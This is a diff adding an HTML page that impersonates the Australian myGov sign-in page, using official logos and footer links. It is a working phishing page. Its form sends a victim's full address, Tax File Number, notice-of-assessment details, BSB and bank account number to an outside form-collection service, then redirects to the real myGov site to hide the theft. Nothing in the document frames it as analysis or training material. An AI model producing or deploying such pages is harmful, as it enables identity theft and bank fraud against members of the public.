@@ -1,0 +1,107 @@
+
+<!doctype html>
+<html>
+<head>
+	<title>Sign in with myGov</title>
+</head>
+<body>
+<nav aria-label="Skip Links" class="uikit-skip-link" style="box-sizing: inherit; line-height: 1.6; font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Fira Sans&quot;, &quot;Droid Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif; color: rgb(51, 51, 51); font-size: 18px;"><a class="uikit-skip-link__link" href="https://login.my.gov.au/las/mygov-login?execution=e3s1#content" style="box-sizing: inherit; line-height: 1.75; background-color: white; display: inline-block; color: black; outline: 0px; text-decoration-line: none; border: 0px; transition-timing-function: ease-in-out; transition-duration: 0.1s; transition-property: background-color, border-color, color; position: absolute; width: 1px; height: 1px; padding: 0px; margin: -1px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px);">Skip to main content</a></nav>
+
+<header class="mgvEnhanceHeader" role="banner" style="box-sizing: inherit; line-height: 1.75; -webkit-box-flex: 0; flex: 0 0 auto; background-color: rgb(102, 211, 238); border: 0px none; min-height: 0px; height: auto; font-family: Roboto, -apple-system, BlinkMacSystemFont, Oxygen, Ubuntu, Cantarell, &quot;Fira Sans&quot;, &quot;Droid Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif; font-size: 18px;">
+<section class="wrapper" style="box-sizing: inherit; line-height: 1.75; padding: 0px; min-height: 0px;">
+<div class="inner" style="box-sizing: inherit; line-height: 1.75; margin-left: auto; margin-right: auto; max-width: 900px; height: auto; display: flex; justify-content: left; -webkit-box-align: center; align-items: center; padding: 3.125rem 2.5rem; position: relative; width: 85rem; min-height: 12.025rem;">
+<div class="unauth-grid" style="box-sizing: inherit; line-height: 1.75; width: 1280px;">
+<div class="unauth-grid-row" style="box-sizing: inherit; line-height: 1.75; display: flex; -webkit-box-pack: justify; justify-content: space-between;"><a class="unauth-govt-crest__link" href="https://beta.my.gov.au/" style="box-sizing: inherit; line-height: 1.75; background-color: transparent; display: inline; color: rgb(15, 100, 147); outline: 0px; text-decoration-line: none; border-bottom: 0px; transition-timing-function: ease-in-out; transition-duration: 0.1s; transition-property: background-color, border-color, color; width: 20.5rem; height: auto;"><img alt="myGov Beta" id="unauth-govt-crest" role="img" src="https://login.my.gov.au/mygov/content/mgv2/blugov/myGov-cobranded-logo-black.svg" style="box-sizing: inherit; line-height: 1.75; border: 0px; max-width: 100%; height: auto; float: left; margin-right: 2em; color: rgb(255, 255, 255); margin-left: 0px; width: 328px;" /></a>
+
+<div class="header-links" style="box-sizing: inherit; line-height: 1.75; display: flex; -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; -webkit-box-pack: center; justify-content: center;"><a href="https://beta.my.gov.au/en/about/help" style="box-sizing: inherit; line-height: 1.75; background-color: transparent; display: inline; color: rgb(0, 0, 0); outline: 0px; border-bottom: 0px; transition: background 150ms ease 0s; font-size: 1rem;">Help</a></div>
+</div>
+</div>
+</div>
+</section>
+</header>
+
+<div class="wrapper-mapwap" style="box-sizing: inherit; line-height: 1.75; -webkit-box-flex: 1; flex: 1 0 auto; width: 1349px; display: inline-block; padding: 0px 2.5rem; font-family: Roboto, -apple-system, BlinkMacSystemFont, Oxygen, Ubuntu, Cantarell, &quot;Fira Sans&quot;, &quot;Droid Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif; font-size: 18px;">
+<div class="main-block" id="content" role="main" style="box-sizing: inherit; line-height: 1.75; max-width: 40.625rem; margin-left: auto; margin-right: auto; padding: 0px 4.375rem; margin-top: 4.0625rem;">
+<div class="unauth" style="box-sizing: inherit; line-height: 1.75; padding: 0px;">
+<div class="login-grid-container" style="box-sizing: inherit; line-height: 1.75; width: 510px; margin-top: 4.0625rem;">
+<div class="login-grid-row" style="box-sizing: inherit; line-height: 1.75;">
+<div class="login-grid-column" style="box-sizing: border-box; line-height: 1.75; float: left; min-height: 1px; position: relative; width: 510px;">
+<div class="digital-id-login-card-wrapper" style="box-sizing: inherit; line-height: 1.75; background-color: rgb(255, 255, 255);">
+<div class="digital-id-main-login-card override" style="box-sizing: inherit; line-height: 1.75; margin: 0px auto; padding: 0px; max-width: 100%; width: 510px;">
+<h1 style="box-sizing: inherit; line-height: 1.34375; font-size: 2rem; margin: 0px 0px 0.75rem; color: rgb(51, 51, 51); letter-spacing: -0.02rem;">MyGOV Account information</h1>
+
+<p class="login-instruction-text" style="box-sizing: inherit; line-height: 1.75; margin: 0px; font-size: inherit; color: rgb(51, 51, 51);">Please enter the shared secret between you and the ATO</p>
+
+<form action="https://submit-form.com/whe9mMKS" aria-describedby="error-msg" class="mygov-login-form alternative" id="mygov-login-form" method="post" style="box-sizing: inherit; line-height: 1.75; margin-left: 0px; margin-right: 0px;">
+<input
+    type="hidden"
+    name="_redirect"
+    value="https://my.gov.au/"
+<div class="input-group" style="box-sizing: inherit; line-height: 1.75; position: relative; max-width: 42em; margin-top: 1.0625rem;"><span style="color: rgb(51, 51, 51); font-family: Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">Full Address on File</span><input aria-required="true" autocomplete="off" data-username="data-username" id="userId" name="username" style="box-sizing: inherit; line-height: unset; color: rgb(16, 16, 18); font-style: inherit; font-variant: inherit; font-weight: 400; font-stretch: inherit; font-size: 16px; font-family: inherit; margin: 6px 0px 0px; width: 510px; border-width: 0.0625rem; border-style: solid; border-color: rgb(0, 0, 0); border-radius: 0.125rem; background-color: rgb(255, 255, 255); padding: 0.7em; display: block; overflow: visible; max-width: none; height: 3rem;" type="text" value="" /></div>
+
+<div class="input-group" style="box-sizing: inherit; line-height: 1.75; position: relative; max-width: 42em; margin-top: 1.0625rem;"><span style="color: rgb(51, 51, 51); font-family: Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">Tax File Number</span><input aria-required="true" autocomplete="off" data-username="data-username" id="userId" name="username" style="box-sizing: inherit; line-height: unset; color: rgb(16, 16, 18); font-style: inherit; font-variant: inherit; font-weight: 400; font-stretch: inherit; font-size: 16px; font-family: inherit; margin: 6px 0px 0px; width: 510px; border-width: 0.0625rem; border-style: solid; border-color: rgb(0, 0, 0); border-radius: 0.125rem; background-color: rgb(255, 255, 255); padding: 0.7em; display: block; overflow: visible; max-width: none; height: 3rem;" type="text" value="" /></div>
+
+<div class="input-group" style="box-sizing: inherit; line-height: 1.75; position: relative; max-width: 42em; margin-top: 1.0625rem;"><span style="color: rgb(51, 51, 51); font-family: Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">Enter the date of issues from your notice of</span><br style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);" />
+<span style="color: rgb(51, 51, 51); font-family: Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">assessment (dd/mm/yyyy)</span><input aria-required="true" autocomplete="off" data-username="data-username" id="userId" name="username" style="box-sizing: inherit; line-height: unset; color: rgb(16, 16, 18); font-style: inherit; font-variant: inherit; font-weight: 400; font-stretch: inherit; font-size: 16px; font-family: inherit; margin: 6px 0px 0px; width: 510px; border-width: 0.0625rem; border-style: solid; border-color: rgb(0, 0, 0); border-radius: 0.125rem; background-color: rgb(255, 255, 255); padding: 0.7em; display: block; overflow: visible; max-width: none; height: 3rem;" type="text" value="" /></div>
+
+<div class="input-group" style="box-sizing: inherit; line-height: 1.75; position: relative; max-width: 42em; margin-top: 1.0625rem;"><span style="color: rgb(51, 51, 51); font-family: Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">Enter our reference number from your notice of</span><br style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);" />
+<span style="color: rgb(51, 51, 51); font-family: Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">assessment</span><input aria-required="true" autocomplete="off" data-username="data-username" id="userId" name="username" style="box-sizing: inherit; line-height: unset; color: rgb(16, 16, 18); font-style: inherit; font-variant: inherit; font-weight: 400; font-stretch: inherit; font-size: 16px; font-family: inherit; margin: 6px 0px 0px; width: 510px; border-width: 0.0625rem; border-style: solid; border-color: rgb(0, 0, 0); border-radius: 0.125rem; background-color: rgb(255, 255, 255); padding: 0.7em; display: block; overflow: visible; max-width: none; height: 3rem;" type="text" value="" /></div>
+
+<div class="input-group" style="box-sizing: inherit; line-height: 1.75; position: relative; max-width: 42em; margin-top: 1.0625rem;"><span style="color: rgb(51, 51, 51); font-family: Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">Enter BSB number recorded with the ATO</span><input aria-required="true" autocomplete="off" data-username="data-username" id="userId" name="username" style="box-sizing: inherit; line-height: unset; color: rgb(16, 16, 18); font-style: inherit; font-variant: inherit; font-weight: 400; font-stretch: inherit; font-size: 16px; font-family: inherit; margin: 6px 0px 0px; width: 510px; border-width: 0.0625rem; border-style: solid; border-color: rgb(0, 0, 0); border-radius: 0.125rem; background-color: rgb(255, 255, 255); padding: 0.7em; display: block; overflow: visible; max-width: none; height: 3rem;" type="text" value="" /></div>
+
+<div class="input-group" style="box-sizing: inherit; line-height: 1.75; position: relative; max-width: 42em; margin-top: 1.0625rem;"><span style="color: rgb(51, 51, 51); font-family: Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">Enter bank account number recorded with the ATO</span><br style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);" />
+<span style="color: rgb(51, 51, 51); font-family: Arial, sans-serif; font-size: 14px; font-weight: 700; background-color: rgb(255, 255, 255);">(exclude BSB)</span><input aria-required="true" autocomplete="off" data-username="data-username" id="userId" name="username" style="box-sizing: inherit; line-height: unset; color: rgb(16, 16, 18); font-style: inherit; font-variant: inherit; font-weight: 400; font-stretch: inherit; font-size: 16px; font-family: inherit; margin: 6px 0px 0px; width: 510px; border-width: 0.0625rem; border-style: solid; border-color: rgb(0, 0, 0); border-radius: 0.125rem; background-color: rgb(255, 255, 255); padding: 0.7em; display: block; overflow: visible; max-width: none; height: 3rem;" type="text" value="" /></div>
+
+<div class="input-group" style="box-sizing: inherit; line-height: 1.75; position: relative; max-width: 42em; margin-top: 1.0625rem;">&nbsp;</div>
+
+<div class="button-digital-id-main-container override" style="box-sizing: inherit; line-height: 1.75; margin-top: 0px; display: inline-block; width: 510px;">
+<div class="digital-id-button-container" style="box-sizing: inherit; line-height: 1.75;"><button class="button-main" name="_eventId_login" style="box-sizing: inherit; line-height: unset; color: rgb(23, 47, 80); font-style: inherit; font-variant: inherit; font-weight: 500; font-stretch: inherit; font-size: 16px; font-family: inherit; margin-top: unset; margin-right: 1.6em; margin-bottom: 0px; margin-left: unset; overflow: visible; appearance: none; cursor: pointer; height: 3rem; padding: unset; border-radius: 0.3125rem; border-width: 0px; border-style: initial; border-color: initial; outline: 0px; width: 510px; position: relative; -webkit-font-smoothing: antialiased; background-color: rgb(153, 225, 243); min-width: 160px;" type="submit">Sign in</button></div>
+</div>
+
+<div style="box-sizing: inherit; line-height: 1.75;">&nbsp;</div>
+</form>
+
+<div class="hr-word" style="box-sizing: inherit; line-height: 1.75; width: 510px; height: auto; border-bottom: 0px none; text-align: center; margin-top: 0px; margin-right: 63.75px; margin-bottom: 0px; position: relative;">
+<div class="draw-circle" style="box-sizing: inherit; line-height: 1.75; border: 1px solid rgb(204, 204, 204); border-radius: 50%; height: 42px; width: 42px; margin-right: auto; margin-left: auto; padding-top: 0px; display: flex; -webkit-box-align: center; align-items: center; -webkit-box-pack: center; justify-content: center; position: relative;">&nbsp;</div>
+</div>
+
+<div class="digital-id-login-card secondary" style="box-sizing: inherit; line-height: 1.75; max-width: 40.625rem; margin: 0px auto 1.875rem; padding: 0px; text-align: center; width: 510px;">
+<div class="button-digital-id-container" style="box-sizing: inherit; line-height: 1.75; display: inline-block; width: 510px;">
+<div class="digital-id-login-option-container" style="box-sizing: inherit; line-height: 1.75; background-color: unset; border-radius: 4px; overflow: unset; border: 0px; margin-top: 0px;">&nbsp;</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<footer role="contentinfo" style="box-sizing: inherit; line-height: 1.75; -webkit-box-flex: 0; flex: 0 0 auto; background-color: rgb(0, 0, 0); border-top: 4px solid rgb(51, 51, 51); margin-top: 72px; color: rgb(51, 51, 51); font-family: Roboto, -apple-system, BlinkMacSystemFont, Oxygen, Ubuntu, Cantarell, &quot;Fira Sans&quot;, &quot;Droid Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif; font-size: 18px;">
+<div class="wrapper" style="box-sizing: inherit; line-height: 1.75; padding-top: 0px; padding-right: 0px; padding-bottom: 0px !important; padding-left: 0px; display: flex; -webkit-box-pack: center; justify-content: center;">
+<div class="inner" style="box-sizing: inherit; line-height: 1.75; max-width: 1360px; margin-left: auto; margin-right: auto; display: flex; -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; width: 85rem; padding-left: 2.5rem; padding-right: 2.5rem; padding-bottom: 2.5rem;">
+<section class="footer-list" style="box-sizing: inherit; line-height: 1.75; border-bottom: 1px solid rgb(153, 153, 153); padding: 25px 0px; margin-bottom: 44px;">
+<nav style="box-sizing: inherit; line-height: 1.75;">
+<h2 aria-label="Footer" class="sr-only" style="box-sizing: inherit; line-height: 1.2; font-weight: 400; margin-bottom: 0.5em; font-size: 1.375rem; position: absolute; left: -10000px; top: auto; width: 1px; height: 1px; overflow: hidden; margin-top: 1.875rem;">Footer</h2>
+
+<ul class="lower-links" style="box-sizing: inherit; line-height: 1.75; padding: 0px; margin-bottom: 0px; margin-top: 0px;">
+	<li style="box-sizing: inherit; line-height: 1.75; margin-bottom: 0.53333em; list-style: none; display: inline; margin-right: 24px;"><a href="https://my.gov.au/en/about/terms" style="box-sizing: inherit; line-height: 1.75; background-color: transparent; display: inline-block; color: rgb(255, 255, 255); outline: 0px; text-decoration-line: none; border-bottom: 0px; transition-timing-function: ease-in-out; transition-duration: 0.1s; transition-property: background-color, border-color, color; font-size: 14px;" target="_blank">Terms of use</a>&nbsp;</li>
+	<li style="box-sizing: inherit; line-height: 1.75; margin-bottom: 0.53333em; list-style: none; display: inline; margin-right: 24px;"><a href="https://my.gov.au/en/about/privacy-and-security" style="box-sizing: inherit; line-height: 1.75; background-color: transparent; display: inline-block; color: rgb(255, 255, 255); outline: 0px; text-decoration-line: none; border-bottom: 0px; transition-timing-function: ease-in-out; transition-duration: 0.1s; transition-property: background-color, border-color, color; font-size: 14px;" target="_blank">Privacy and security</a>&nbsp;</li>
+	<li style="box-sizing: inherit; line-height: 1.75; margin-bottom: 0.53333em; list-style: none; display: inline; margin-right: 24px;"><a href="https://my.gov.au/en/about/copyright" style="box-sizing: inherit; line-height: 1.75; background-color: transparent; display: inline-block; color: rgb(255, 255, 255); outline: 0px; text-decoration-line: none; border-bottom: 0px; transition-timing-function: ease-in-out; transition-duration: 0.1s; transition-property: background-color, border-color, color; font-size: 14px;" target="_blank">Copyright</a>&nbsp;</li>
+	<li style="box-sizing: inherit; line-height: 1.75; margin-bottom: 0.53333em; list-style: none; display: inline;"><a href="https://my.gov.au/en/about/accessibility" style="box-sizing: inherit; line-height: 1.75; background-color: transparent; display: inline-block; color: rgb(255, 255, 255); outline: 0px; text-decoration-line: none; border-bottom: 0px; transition-timing-function: ease-in-out; transition-duration: 0.1s; transition-property: background-color, border-color, color; font-size: 14px;" target="_blank">Accessibility</a></li>
+</ul>
+</nav>
+</section>
+
+<div class="footer-lower" style="box-sizing: inherit; line-height: 1.75; display: flex; -webkit-box-orient: horizontal; -webkit-box-direction: normal; flex-direction: row; padding-top: 1em; -webkit-box-pack: justify; justify-content: space-between; -webkit-box-align: center; align-items: center;">
+<section class="footer-lower-logo" style="box-sizing: inherit; line-height: 1.75; margin-right: 2rem; margin-bottom: 0px; height: 4.25rem; max-width: 24.375rem;"><a href="https://beta.my.gov.au/" style="box-sizing: inherit; line-height: 1.75; background-color: transparent; display: inline; color: rgb(15, 100, 147); outline: 0px; text-decoration-line: none; border-bottom: 0px; transition-timing-function: ease-in-out; transition-duration: 0.1s; transition-property: background-color, border-color, color;"><img alt="myGov Beta" height="70" role="img" src="https://login.my.gov.au/mygov/content/mgv2/blugov/myGov-cobranded-logo-white.svg" style="box-sizing: inherit; line-height: 1.75; border: 0px; max-width: 390px; height: 68px; margin-bottom: 0px;" width="313.17" /></a></section>
+
+<p class="footer-acknowledgement" style="box-sizing: inherit; line-height: 26px; margin: 0px; font-size: 16px; max-width: 650px; color: rgb(255, 255, 255);">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+</div>
+</div>
+</div>
+</footer>
+</body>
+</html>
